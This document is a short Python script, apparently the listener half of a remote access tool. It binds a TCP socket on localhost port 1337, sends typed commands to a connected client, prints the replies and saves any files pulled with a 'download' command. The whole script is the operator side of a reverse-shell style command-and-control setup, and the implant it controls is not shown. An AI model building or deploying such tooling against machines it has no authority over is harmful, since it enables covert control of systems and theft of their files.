import socket

HOST = "127.0.0.1"  
PORT = 1337  

def main():

    print("[*] Building socket...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))

        print("[*] Listining for connections...")
        s.listen()
        connection, address = s.accept()

        with connection:
            print(f"[+] Connected to : {address}")

            while True:
                msg = input("[~] Command : ").encode()
                connection.sendall(msg)

                data = b""
                while True:
                    chunk = connection.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    if b"\0" in chunk:
                        break

                if (msg.startswith(b"download")):
                    with open(msg.decode().split(" ")[1], 'wb') as f:
                        f.write(data)
                    print("[+] File downloaded successfully.")

                else:
                    print(data.decode())

if __name__ == '__main__':
    main()